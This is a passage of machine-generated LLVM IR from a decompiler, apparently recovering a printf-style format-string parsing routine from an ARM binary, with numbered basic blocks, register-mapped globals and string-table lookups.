dec_label_pc_e7bc:                                ; preds = %.dec_label_pc_e7bc_crit_edge, %dec_label_pc_e7b0
  %v3_e7f0.pre-phi = phi i32 [ %.pre, %.dec_label_pc_e7bc_crit_edge ], [ %v2_e784, %dec_label_pc_e7b0 ]
  %v0_e7e862 = phi i32 [ %v3_e76c, %.dec_label_pc_e7bc_crit_edge ], [ %v2_e7b8, %dec_label_pc_e7b0 ]
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 920, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_19b50.337 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 -4, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_19b50.337, i32 0, i32 0), i8** %stack_var_-120, align 4
  br label %dec_label_pc_e7e8

dec_label_pc_e7e4:                                ; preds = %.thread19, %dec_label_pc_e918
  %v0_e7e4 = phi i32 [ %v2_e990, %.thread19 ], [ %v0_e8f474, %dec_label_pc_e918 ]
  %stack_var_-44.0 = phi i32 [ %stack_var_-44.3, %.thread19 ], [ %stack_var_-44.2, %dec_label_pc_e918 ]
  store i32 %v0_e7e4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e7e8

dec_label_pc_e7e8:                                ; preds = %dec_label_pc_e7bc, %dec_label_pc_e7e4
  %v1_e7fc = phi i32 [ %v0_e7e862, %dec_label_pc_e7bc ], [ %v0_e7e4, %dec_label_pc_e7e4 ]
  %stack_var_-44.1 = phi i32 [ %tmp115, %dec_label_pc_e7bc ], [ %stack_var_-44.0, %dec_label_pc_e7e4 ]
  %v1_e7e8 = inttoptr i32 %v1_e7fc to i8*
  %v2_e7e8 = load i8, i8* %v1_e7e8, align 1
  %v3_e7e8 = zext i8 %v2_e7e8 to i32
  store i32 %v3_e7e8, i32* %r3.global-to-local, align 4
  %v7_e7ec = icmp eq i8 %v2_e7e8, 42
  br i1 %v7_e7ec, label %bb, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_e7e8
  store i32 %v1_e7fc, i32* %r6.global-to-local, align 4
  %v0_e800 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_e800, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e848.preheader

bb:                                               ; preds = %dec_label_pc_e7e8
  %v1_e7f4 = load i32, i32* %r8.global-to-local, align 4
  %v2_e7f4 = load i32, i32* %sb.global-to-local, align 4
  %v4_e7f4 = mul i32 %v2_e7f4, %v1_e7f4
  %v5_e7f4 = add i32 %v4_e7f4, %v3_e7f0.pre-phi
  store i32 %v5_e7f4, i32* %r3.global-to-local, align 4
  %v2_e7fc = add i32 %v1_e7fc, 1
  store i32 %v2_e7fc, i32* %r6.global-to-local, align 4
  %v0_e800109 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_e800109, i32* %r1.global-to-local, align 4
  %v3_e804 = add i32 %v5_e7f4, -40
  %v4_e804 = inttoptr i32 %v3_e804 to i32*
  store i32 %v0_e800109, i32* %v4_e804, align 4
  %v0_e84c.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_e848.preheader

dec_label_pc_e848.preheader:                      ; preds = %.thread7, %bb
  %v0_e84c.pre = phi i32 [ %v1_e7fc, %.thread7 ], [ %v0_e84c.pre.pre, %bb ]
  %v0_e850.pre = load i32, i32* @lr, align 4
  %v2_e850 = add i32 %v0_e850.pre, 920
  %v3_e850 = inttoptr i32 %v2_e850 to i32*
  br label %dec_label_pc_e848

dec_label_pc_e80c:                                ; preds = %dec_label_pc_e848
  store i32 214748363, i32* %r3.global-to-local, align 4
  %v0_e810 = load i32, i32* %r1.global-to-local, align 4
  %v2_e810 = add i32 %v0_e810, -214748363
  %tmp137 = sub i32 214748362, %v0_e810
  %v6_e810 = and i32 %tmp137, %v0_e810
  %v7_e810 = icmp slt i32 %v6_e810, 0
  %v8_e810 = icmp slt i32 %v2_e810, 0
  %v9_e810 = icmp eq i32 %v0_e810, 214748363
  %v3_e814 = xor i1 %v8_e810, %v7_e810
  %v4_e814 = or i1 %v9_e810, %v3_e814
  br i1 %v4_e814, label %dec_label_pc_e82c, label %dec_label_pc_e818

dec_label_pc_e818:                                ; preds = %dec_label_pc_e80c
  store i32 214748364, i32* %r2.global-to-local, align 4
  %v9_e81c = icmp eq i32 %v0_e810, 214748364
  br i1 %v9_e81c, label %dec_label_pc_e824, label %dec_label_pc_e844

dec_label_pc_e824:                                ; preds = %dec_label_pc_e818
  %v8_e828 = icmp ugt i8 %v2_e84c, 55
  br i1 %v8_e828, label %dec_label_pc_e844, label %dec_label_pc_e82c

dec_label_pc_e82c:                                ; preds = %dec_label_pc_e824, %dec_label_pc_e80c
  %v2_e830 = mul i32 %v0_e810, 10
  %v1_e834 = add i32 %v2_e830, -48
  store i32 %v1_e834, i32* %r3.global-to-local, align 4
  %v2_e838 = add i32 %v1_e834, %v3_e84c
  br label %dec_label_pc_e844

dec_label_pc_e844:                                ; preds = %dec_label_pc_e824, %dec_label_pc_e818, %dec_label_pc_e82c
  %storemerge = phi i32 [ %v2_e838, %dec_label_pc_e82c ], [ 2147483647, %dec_label_pc_e818 ], [ 2147483647, %dec_label_pc_e824 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_e844 = add i32 %v0_e8cc, 1
  store i32 %v1_e844, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_e848

dec_label_pc_e848:                                ; preds = %dec_label_pc_e848.preheader, %dec_label_pc_e844
  %v0_e8cc = phi i32 [ %v0_e84c.pre, %dec_label_pc_e848.preheader ], [ %v1_e844, %dec_label_pc_e844 ]
  store i32 920, i32* %r2.global-to-local, align 4
  %v1_e84c = inttoptr i32 %v0_e8cc to i8*
  %v2_e84c = load i8, i8* %v1_e84c, align 1
  %v3_e84c = zext i8 %v2_e84c to i32
  store i32 %v3_e84c, i32* @ip, align 4
  %v4_e850 = load i32, i32* %v3_e850, align 4
  store i32 %v4_e850, i32* %r3.global-to-local, align 4
  %v2_e854 = mul nuw nsw i32 %v3_e84c, 2
  store i32 %v2_e854, i32* %r2.global-to-local, align 4
  %v2_e858 = add i32 %v2_e854, %v4_e850
  %v3_e858 = inttoptr i32 %v2_e858 to i16*
  %v4_e858 = load i16, i16* %v3_e858, align 2
  %v6_e858 = zext i16 %v4_e858 to i32
  store i32 %v6_e858, i32* %r3.global-to-local, align 4
  %v1_e85c = and i32 %v6_e858, 8
  %v2_e85c = icmp eq i32 %v1_e85c, 0
  br i1 %v2_e85c, label %dec_label_pc_e864, label %dec_label_pc_e80c

dec_label_pc_e864:                                ; preds = %dec_label_pc_e848
  %v0_e864 = load i32, i32* %r0.global-to-local, align 4
  %v1_e864 = add i32 %v0_e864, -1
  %v2_e864 = inttoptr i32 %v1_e864 to i8*
  %v3_e864 = load i8, i8* %v2_e864, align 1
  %v4_e864 = zext i8 %v3_e864 to i32
  store i32 %v4_e864, i32* %r3.global-to-local, align 4
  %v7_e868 = icmp eq i8 %v3_e864, 37
  br i1 %v7_e868, label %dec_label_pc_e870, label %dec_label_pc_e930

dec_label_pc_e870:                                ; preds = %dec_label_pc_e864
  %v7_e870 = icmp eq i8 %v2_e84c, 36
  %. = zext i1 %v7_e870 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v0_e87c = load i32, i32* %r1.global-to-local, align 4
  %tmp141 = icmp slt i32 %v0_e87c, 1
  br i1 %tmp141, label %bb142, label %thread-pre-split

bb142:                                            ; preds = %dec_label_pc_e870
  store i32 0, i32* %r3.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_e870, %bb142
  %v0_e884 = phi i32 [ 0, %bb142 ], [ %., %dec_label_pc_e870 ]
  %v2_e884 = icmp eq i32 %v0_e884, 0
  %v0_e8b8 = load i32, i32* %fp.global-to-local, align 4
  br i1 %v2_e884, label %dec_label_pc_e8b8, label %dec_label_pc_e88c

dec_label_pc_e88c:                                ; preds = %thread-pre-split
  %v2_e8b8 = icmp eq i32 %v0_e8b8, 0
  %v1_e890 = add i32 %v0_e8cc, 1
  store i32 %v1_e890, i32* %r0.global-to-local, align 4
  br i1 %v2_e8b8, label %dec_label_pc_ec64, label %dec_label_pc_e898

dec_label_pc_e898:                                ; preds = %dec_label_pc_e88c
  %v2_e898 = sub i32 %v0_e87c, %v0_e8b8
  %v4_e898 = xor i32 %v0_e8b8, %v0_e87c
  %v5_e898 = xor i32 %v2_e898, %v0_e87c
  %v6_e898 = and i32 %v5_e898, %v4_e898
  %v7_e898 = icmp slt i32 %v6_e898, 0
  %v8_e898 = icmp slt i32 %v2_e898, 0
  %v9_e898 = icmp eq i32 %v0_e87c, %v0_e8b8
  %v3_e89c = xor i1 %v8_e898, %v7_e898
  %v4_e89c = or i1 %v9_e898, %v3_e89c
  br i1 %v4_e89c, label %dec_label_pc_e8ac, label %bb143

bb143:                                            ; preds = %dec_label_pc_e898
  store i32 %v0_e87c, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_e8ac

dec_label_pc_e8a8:                                ; preds = %dec_label_pc_e8cc, %dec_label_pc_e8d4
  %v0_e8a8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_e8a8, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_e8ac

dec_label_pc_e8ac:                                ; preds = %bb143, %dec_label_pc_e898, %dec_label_pc_e8a8
  %v0_e8ac = phi i32 [ %v0_e864, %dec_label_pc_e8a8 ], [ %v1_e890, %dec_label_pc_e898 ], [ %v1_e890, %bb143 ]
  %stack_var_-44.2 = phi i32 [ %stack_var_-44.1, %dec_label_pc_e8a8 ], [ %v0_e87c, %dec_label_pc_e898 ], [ %v0_e87c, %bb143 ]
  store i32 %v0_e8ac, i32* %r6.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  %v2_e8e8.pre = load i8*, i8** %stack_var_-120, align 4
  %v3_e8e8 = ptrtoint i8* %v2_e8e8.pre to i32
  br label %dec_label_pc_e8e8

dec_label_pc_e8b8:                                ; preds = %thread-pre-split
  %tmp144 = icmp slt i32 %v0_e8b8, 1
  br i1 %tmp144, label %dec_label_pc_e8cc, label %dec_label_pc_e8c0

dec_label_pc_e8c0:                                ; preds = %dec_label_pc_e8b8
  %v7_e8c0 = icmp eq i8 %v2_e84c, 109
  br i1 %v7_e8c0, label %dec_label_pc_e930, label %dec_label_pc_ec64

dec_label_pc_e8cc:                                ; preds = %dec_label_pc_e8b8
  %tmp181 = icmp ugt i32 %v0_e8cc, %v0_e864
  br i1 %tmp181, label %dec_label_pc_e8d4, label %dec_label_pc_e8a8

dec_label_pc_e8d4:                                ; preds = %dec_label_pc_e8cc
  %v1_e8d4 = inttoptr i32 %v0_e864 to i8*
  %v2_e8d4 = load i8, i8* %v1_e8d4, align 1
  %v3_e8d4 = zext i8 %v2_e8d4 to i32
  store i32 %v3_e8d4, i32* %r3.global-to-local, align 4
  %v7_e8d8 = icmp eq i8 %v2_e8d4, 48
  br i1 %v7_e8d8, label %dec_label_pc_e8a8, label %bb145

bb145:                                            ; preds = %dec_label_pc_e8d4
  %v1_e8dc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_e8dc, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_e930

dec_label_pc_e8e8.loopexit:                       ; preds = %dec_label_pc_e8f0
  %v1_e8fc = load i32, i32* @r4, align 4
  %v3_e8fc = or i32 %v1_e8fc, %v0_e910
  store i32 %v3_e8fc, i32* @r4, align 4
  %v2_e900 = add i32 %v0_e8f474, 1
  store i32 %v2_e900, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_e8e8

dec_label_pc_e8e8:                                ; preds = %dec_label_pc_e8e8.loopexit, %dec_label_pc_e8ac
  %v0_e8f474 = phi i32 [ %v2_e900, %dec_label_pc_e8e8.loopexit ], [ %v0_e8ac, %dec_label_pc_e8ac ]
  store i32 %v3_e8e8, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_e8f4 = inttoptr i32 %v0_e8f474 to i8*
  br label %dec_label_pc_e8f0

dec_label_pc_e8f0:                                ; preds = %dec_label_pc_e908, %dec_label_pc_e8e8
  %v0_e910 = phi i32 [ %v2_e910, %dec_label_pc_e908 ], [ 1, %dec_label_pc_e8e8 ]
  %v0_e8f0 = phi i32 [ %v5_e8f0, %dec_label_pc_e908 ], [ %v3_e8e8, %dec_label_pc_e8e8 ]
  %v1_e8f0 = inttoptr i32 %v0_e8f0 to i8*
  %v2_e8f0 = load i8, i8* %v1_e8f0, align 1
  %v3_e8f0 = zext i8 %v2_e8f0 to i32
  store i32 %v3_e8f0, i32* %r2.global-to-local, align 4
  %v5_e8f0 = add i32 %v0_e8f0, 1
  store i32 %v5_e8f0, i32* %r0.global-to-local, align 4
  %v2_e8f4 = load i8, i8* %v1_e8f4, align 1
  %v3_e8f4 = zext i8 %v2_e8f4 to i32
  store i32 %v3_e8f4, i32* %r3.global-to-local, align 4
  %v9_e8f8 = icmp eq i8 %v2_e8f4, %v2_e8f0
  br i1 %v9_e8f8, label %dec_label_pc_e8e8.loopexit, label %dec_label_pc_e908

dec_label_pc_e908:                                ; preds = %dec_label_pc_e8f0
  %v1_e908 = inttoptr i32 %v5_e8f0 to i8*
  %v2_e908 = load i8, i8* %v1_e908, align 1
  %v3_e908 = zext i8 %v2_e908 to i32
  store i32 %v3_e908, i32* %r3.global-to-local, align 4
  %v2_e90c = icmp eq i8 %v2_e908, 0
  %v2_e910 = mul i32 %v0_e910, 2
  store i32 %v2_e910, i32* %r1.global-to-local, align 4
  br i1 %v2_e90c, label %dec_label_pc_e918, label %dec_label_pc_e8f0

dec_label_pc_e918:                                ; preds = %dec_label_pc_e908
  %v1_e918 = add i32 %v0_e8f474, -1
  %v2_e918 = inttoptr i32 %v1_e918 to i8*
  %v3_e918 = load i8, i8* %v2_e918, align 1
  %v7_e91c = icmp eq i8 %v3_e918, 37
  %v0_e920 = load i32, i32* @r4, align 4
  %v1_e920 = and i32 %v0_e920, 10
  store i32 %v1_e920, i32* %r3.global-to-local, align 4
  %v4_e924 = udiv i32 %v1_e920, 2
  %v5_e924 = sub nuw nsw i32 -1, %v4_e924
  %v6_e924 = and i32 %v0_e920, %v5_e924
  store i32 %v6_e924, i32* @r4, align 4
  br i1 %v7_e91c, label %dec_label_pc_e92c, label %dec_label_pc_e7e4

dec_label_pc_e92c:                                ; preds = %dec_label_pc_e918
  %v0_e92c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_e92c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e930

dec_label_pc_e930:                                ; preds = %bb145, %dec_label_pc_e864, %dec_label_pc_e8c0, %dec_label_pc_e92c
  %v1_e970 = phi i32 [ %v0_e8f474, %dec_label_pc_e92c ], [ %v0_e8cc, %bb145 ], [ %v0_e8cc, %dec_label_pc_e8c0 ], [ %v0_e8cc, %dec_label_pc_e864 ]
  %v0_e96c = phi i32 [ %v5_e8f0, %dec_label_pc_e92c ], [ %v0_e864, %bb145 ], [ %v0_e864, %dec_label_pc_e8c0 ], [ %v0_e864, %dec_label_pc_e864 ]
  %stack_var_-44.3 = phi i32 [ %stack_var_-44.2, %dec_label_pc_e92c ], [ %stack_var_-44.1, %bb145 ], [ %stack_var_-44.1, %dec_label_pc_e8c0 ], [ %stack_var_-44.1, %dec_label_pc_e864 ]
  %v1_e930 = inttoptr i32 %v0_e96c to i8*
  %v2_e930 = load i8, i8* %v1_e930, align 1
  %v3_e930 = zext i8 %v2_e930 to i32
  store i32 %v3_e930, i32* %r3.global-to-local, align 4
  %v7_e934 = icmp eq i8 %v2_e930, 42
  br i1 %v7_e934, label %dec_label_pc_e93c, label %dec_label_pc_e97c

dec_label_pc_e93c:                                ; preds = %dec_label_pc_e930
  %v0_e93c = load i32, i32* %fp.global-to-local, align 4
  %v2_e93c = icmp eq i32 %v0_e93c, 0
  br i1 %v2_e93c, label %dec_label_pc_e96c, label %dec_label_pc_e944

dec_label_pc_e944:                                ; preds = %dec_label_pc_e93c
  %v1_e944 = inttoptr i32 %v1_e970 to i8*
  %v2_e944 = load i8, i8* %v1_e944, align 1
  %v3_e944 = zext i8 %v2_e944 to i32
  store i32 %v3_e944, i32* %r3.global-to-local, align 4
  %v7_e948 = icmp eq i8 %v2_e944, 36
  br i1 %v7_e948, label %dec_label_pc_e950, label %dec_label_pc_ec64

dec_label_pc_e950:                                ; preds = %dec_label_pc_e944
  %v0_e950 = load i32, i32* %r1.global-to-local, align 4
  %tmp146 = icmp slt i32 %v0_e950, 1
  br i1 %tmp146, label %dec_label_pc_ec64, label %dec_label_pc_e958

dec_label_pc_e958:                                ; preds = %dec_label_pc_e950
  %v0_e95c = load i32, i32* %r8.global-to-local, align 4
  %v1_e95c = load i32, i32* %sb.global-to-local, align 4
  %v3_e95c = mul i32 %v1_e95c, %v0_e95c
  %v4_e95c = add i32 %v3_e95c, %v3_e7f0.pre-phi
  store i32 %v4_e95c, i32* %r3.global-to-local, align 4
  %v1_e960 = add i32 %v1_e970, 1
  store i32 %v1_e960, i32* %r6.global-to-local, align 4
  %v2_e964 = add i32 %v4_e95c, -12
  %v3_e964 = inttoptr i32 %v2_e964 to i32*
  store i32 %v0_e950, i32* %v3_e964, align 4
  br label %dec_label_pc_e978

dec_label_pc_e96c:                                ; preds = %dec_label_pc_e93c
  %v1_e96c = add i32 %v0_e96c, 1
  store i32 %v1_e96c, i32* %r3.global-to-local, align 4
  %v9_e970 = icmp eq i32 %v1_e96c, %v1_e970
  br i1 %v9_e970, label %dec_label_pc_e978, label %dec_label_pc_ec64

dec_label_pc_e978:                                ; preds = %dec_label_pc_e96c, %dec_label_pc_e958
  store i32 -2147483648, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e97c

dec_label_pc_e97c:                                ; preds = %dec_label_pc_e930, %dec_label_pc_e978
  %v0_e97c = load i32, i32* %r8.global-to-local, align 4
  %v2_e97c = icmp eq i32 %v0_e97c, 0
  br i1 %v2_e97c, label %dec_label_pc_e988, label %dec_label_pc_e9a8.loopexit

dec_label_pc_e988:                                ; preds = %dec_label_pc_e97c
  %v0_e988 = load i32, i32* %r6.global-to-local, align 4
  %v1_e988 = inttoptr i32 %v0_e988 to i8*
  %v2_e988 = load i8, i8* %v1_e988, align 1
  %v3_e988 = zext i8 %v2_e988 to i32
  store i32 %v3_e988, i32* %r3.global-to-local, align 4
  %v7_e98c = icmp eq i8 %v2_e988, 46
  br i1 %v7_e98c, label %.thread19, label %dec_label_pc_e9a0

.thread19:                                        ; preds = %dec_label_pc_e988
  %v2_e990 = add i32 %v0_e988, 1
  store i32 %v2_e990, i32* %r6.global-to-local, align 4
  %v1_e994 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_e994, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_e7e4

dec_label_pc_e9a0:                                ; preds = %dec_label_pc_e988
  %v0_e9a0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_e9a0, i32* %sl.global-to-local, align 4
  store i32 -1, i32* @r5, align 4
  br label %dec_label_pc_e9a8

dec_label_pc_e9a8.loopexit:                       ; preds = %dec_label_pc_e97c
  %v1_e980 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_e980, i32* @r5, align 4
  %v0_e9b4.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_e9a8

dec_label_pc_e9a8:                                ; preds = %dec_label_pc_e9a8.loopexit, %dec_label_pc_e9a0
  %v0_e9b4.pre = phi i32 [ %v0_e9b4.pre.pre, %dec_label_pc_e9a8.loopexit ], [ %v0_e988, %dec_label_pc_e9a0 ]
  store i32 -37792, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_19ad4.341 to i32), i32* %r1.global-to-local, align 4
  %v1_e9b4 = inttoptr i32 %v0_e9b4.pre to i8*
  br label %dec_label_pc_e9b0

dec_label_pc_e9b0:                                ; preds = %dec_label_pc_e9c4, %dec_label_pc_e9a8
  %v0_e9c4 = phi i32 [ %v1_e9c4, %dec_label_pc_e9c4 ], [ ptrtoint ([9 x i8]* @global_var_19ad4.341 to i32), %dec_label_pc_e9a8 ]
  %v1_e9b0 = inttoptr i32 %v0_e9c4 to i8*
  %v2_e9b0 = load i8, i8* %v1_e9b0, align 1
  %v3_e9b0 = zext i8 %v2_e9b0 to i32
  store i32 %v3_e9b0, i32* %r2.global-to-local, align 4
  %v2_e9b4 = load i8, i8* %v1_e9b4, align 1
  %v3_e9b4 = zext i8 %v2_e9b4 to i32
  store i32 %v3_e9b4, i32* %r3.global-to-local, align 4
  %v9_e9b8 = icmp eq i8 %v2_e9b4, %v2_e9b0
  br i1 %v9_e9b8, label %bb147, label %dec_label_pc_e9c4

bb147:                                            ; preds = %dec_label_pc_e9b0
  %v2_e9bc = add i32 %v0_e9b4.pre, 1
  store i32 %v2_e9bc, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_e9d0

dec_label_pc_e9c4:                                ; preds = %dec_label_pc_e9b0
  %v1_e9c4 = add i32 %v0_e9c4, 1
  %v2_e9c4 = inttoptr i32 %v1_e9c4 to i8*
  %v3_e9c4 = load i8, i8* %v2_e9c4, align 1
  %v4_e9c4 = zext i8 %v3_e9c4 to i32
  store i32 %v4_e9c4, i32* %r3.global-to-local, align 4
  store i32 %v1_e9c4, i32* %r1.global-to-local, align 4
  %v2_e9c8 = icmp eq i8 %v3_e9c4, 0
  br i1 %v2_e9c8, label %dec_label_pc_e9d0, label %dec_label_pc_e9b0

dec_label_pc_e9d0:                                ; preds = %dec_label_pc_e9c4, %bb147
  %v1_e9f4 = phi i32 [ %v2_e9bc, %bb147 ], [ %v0_e9b4.pre, %dec_label_pc_e9c4 ]
  %v1_e9f0 = phi i32 [ %v0_e9c4, %bb147 ], [ %v1_e9c4, %dec_label_pc_e9c4 ]
  %v2_e9d8 = sub i32 %v1_e9f0, ptrtoint ([9 x i8]* @global_var_19ad4.341 to i32)
  store i32 %v2_e9d8, i32* %r3.global-to-local, align 4
  %v8_e9e0 = icmp sgt i32 %v2_e9d8, 1
  br i1 %v8_e9e0, label %.thread23, label %dec_label_pc_e9e4

dec_label_pc_e9e4:                                ; preds = %dec_label_pc_e9d0
  %v1_e9e4 = inttoptr i32 %v1_e9f4 to i8*
  %v2_e9e4 = load i8, i8* %v1_e9e4, align 1
  %v3_e9e4 = zext i8 %v2_e9e4 to i32
  store i32 %v3_e9e4, i32* %r2.global-to-local, align 4
  %v1_e9e8 = inttoptr i32 %v1_e9f0 to i8*
  %v2_e9e8 = load i8, i8* %v1_e9e8, align 1
  %v3_e9e8 = zext i8 %v2_e9e8 to i32
  store i32 %v3_e9e8, i32* %r3.global-to-local, align 4
  %v9_e9ec = icmp eq i8 %v2_e9e4, %v2_e9e8
  br i1 %v9_e9ec, label %bb148, label %.thread23

bb148:                                            ; preds = %dec_label_pc_e9e4
  %v2_e9f0 = add i32 %v1_e9f0, 9
  store i32 %v2_e9f0, i32* %r1.global-to-local, align 4
  %v2_e9f4 = add i32 %v1_e9f4, 1
  store i32 %v2_e9f4, i32* %r6.global-to-local, align 4
  br label %.thread23

.thread23:                                        ; preds = %dec_label_pc_e9e4, %dec_label_pc_e9d0, %bb148
  %v0_e9fc = phi i32 [ %v1_e9f0, %dec_label_pc_e9e4 ], [ %v1_e9f0, %dec_label_pc_e9d0 ], [ %v2_e9f0, %bb148 ]
  %v0_e9f8 = phi i32 [ %v1_e9f4, %dec_label_pc_e9e4 ], [ %v1_e9f4, %dec_label_pc_e9d0 ], [ %v2_e9f4, %bb148 ]
  %v1_e9f8 = inttoptr i32 %v0_e9f8 to i8*
  %v2_e9f8 = load i8, i8* %v1_e9f8, align 1
  %v3_e9f8 = zext i8 %v2_e9f8 to i32
  store i32 %v3_e9f8, i32* %r2.global-to-local, align 4
  %v1_e9fc = add i32 %v0_e9fc, 9
  %v2_e9fc = inttoptr i32 %v1_e9fc to i8*
  %v3_e9fc = load i8, i8* %v2_e9fc, align 1
  %v4_e9fc = zext i8 %v3_e9fc to i32
  store i32 %v4_e9fc, i32* %r3.global-to-local, align 4
  %v2_ea00 = icmp eq i8 %v2_e9f8, 0
  %v3_ea04 = mul nuw nsw i32 %v4_e9fc, 256
  store i32 %v3_ea04, i32* @ip, align 4
  br i1 %v2_ea00, label %dec_label_pc_ec64, label %dec_label_pc_ea0c

dec_label_pc_ea0c:                                ; preds = %.thread23
  store i32 -37692, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_19b38.343 to i32), i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ea14

dec_label_pc_ea14:                                ; preds = %dec_label_pc_ea98, %dec_label_pc_ea0c
  %v1_ea28 = phi i32 [ %v1_ea98, %dec_label_pc_ea98 ], [ ptrtoint ([21 x i8]* @global_var_19b38.343 to i32), %dec_label_pc_ea0c ]
  %v1_ea14 = inttoptr i32 %v1_ea28 to i8*
  %v2_ea14 = load i8, i8* %v1_ea14, align 1
  %v3_ea14 = zext i8 %v2_ea14 to i32
  store i32 %v3_ea14, i32* %r3.global-to-local, align 4
  %v9_ea18 = icmp eq i8 %v2_ea14, %v2_e9f8
  br i1 %v9_ea18, label %dec_label_pc_ea20, label %dec_label_pc_ea98

dec_label_pc_ea20:                                ; preds = %dec_label_pc_ea14
  store i32 ptrtoint ([21 x i8]* @global_var_19b38.343 to i32), i32* %r3.global-to-local, align 4
  %v2_ea28 = sub i32 %v1_ea28, ptrtoint ([21 x i8]* @global_var_19b38.343 to i32)
  store i32 %v2_ea28, i32* %r1.global-to-local, align 4
  %v7_ea30 = icmp slt i32 %v2_ea28, 18
  br i1 %v7_ea30, label %bb150, label %dec_label_pc_ea34

dec_label_pc_ea34:                                ; preds = %dec_label_pc_ea20
  %v1_ea34 = and i32 %v3_ea04, 1024
  %v2_ea34 = icmp eq i32 %v1_ea34, 0
  br i1 %v2_ea34, label %bb150, label %bb149

bb149:                                            ; preds = %dec_label_pc_ea34
  %v2_ea38 = add i32 %v2_ea28, -2
  store i32 %v2_ea38, i32* %r1.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %dec_label_pc_ea20, %dec_label_pc_ea34, %bb149
  %v0_ea40 = phi i32 [ %v2_ea28, %dec_label_pc_ea20 ], [ %v2_ea28, %dec_label_pc_ea34 ], [ %v2_ea38, %bb149 ]
  %v1_ea40 = load i32, i32* %r7.global-to-local, align 4
  %v2_ea40 = add i32 %v1_ea40, 32
  %v3_ea40 = inttoptr i32 %v2_ea40 to i32*
  store i32 %v0_ea40, i32* %v3_ea40, align 4
  store i32 ptrtoint (i32* @global_var_19b08.345 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19b07.346 to i32), i32* %r0.global-to-local, align 4
  %v0_ea50.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_ea4c

dec_label_pc_ea4c:                                ; preds = %dec_label_pc_ea4c, %bb150
  %v0_ea4c = phi i32 [ %v1_ea4c, %dec_label_pc_ea4c ], [ ptrtoint (i32* @global_var_19b07.346 to i32), %bb150 ]
  %v1_ea4c = add i32 %v0_ea4c, 1
  %v2_ea4c = inttoptr i32 %v1_ea4c to i8*
  %v3_ea4c = load i8, i8* %v2_ea4c, align 1
  %v4_ea4c = zext i8 %v3_ea4c to i32
  store i32 %v4_ea4c, i32* %r3.global-to-local, align 4
  store i32 %v1_ea4c, i32* %r0.global-to-local, align 4
  %v8_ea54 = icmp sgt i32 %v0_ea50.pre, %v4_ea4c
  br i1 %v8_ea54, label %dec_label_pc_ea4c, label %dec_label_pc_ea58

dec_label_pc_ea58:                                ; preds = %dec_label_pc_ea4c
  %v2_ea64 = sub i32 %v1_ea4c, ptrtoint (i32* @global_var_19b08.345 to i32)
  %v2_ea68 = mul i32 %v2_ea64, 2
  store i32 %v2_ea68, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19af8.348 to i32), i32* %r3.global-to-local, align 4
  %v2_ea70 = add i32 %v2_ea68, ptrtoint (i32* @global_var_19af8.348 to i32)
  %v3_ea70 = inttoptr i32 %v2_ea70 to i16*
  %v4_ea70 = load i16, i16* %v3_ea70, align 2
  %v6_ea70 = sext i16 %v4_ea70 to i32
  store i32 %v6_ea70, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19ae8.350 to i32), i32* %r3.global-to-local, align 4
  %v2_ea7c = add i32 %v2_ea68, ptrtoint (i32* @global_var_19ae8.350 to i32)
  %v3_ea7c = inttoptr i32 %v2_ea7c to i16*
  %v4_ea7c = load i16, i16* %v3_ea7c, align 2
  %v6_ea7c = sext i16 %v4_ea7c to i32
  %v1_ea80 = load i32, i32* @ip, align 4
  %v2_ea80 = or i32 %v1_ea80, %v6_ea70
  %v2_ea84 = and i32 %v2_ea80, %v6_ea7c
  store i32 %v2_ea84, i32* %r1.global-to-local, align 4
  store i32 -37692, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_19b38.343 to i32), i32* %r0.global-to-local, align 4
  store i32 %v2_ea84, i32* %stack_var_-72, align 4
  %v0_eab0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_eaa4

dec_label_pc_ea98:                                ; preds = %dec_label_pc_ea14
  %v1_ea98 = add i32 %v1_ea28, 1
  %v2_ea98 = inttoptr i32 %v1_ea98 to i8*
  %v3_ea98 = load i8, i8* %v2_ea98, align 1
  %v4_ea98 = zext i8 %v3_ea98 to i32
  store i32 %v4_ea98, i32* %r3.global-to-local, align 4
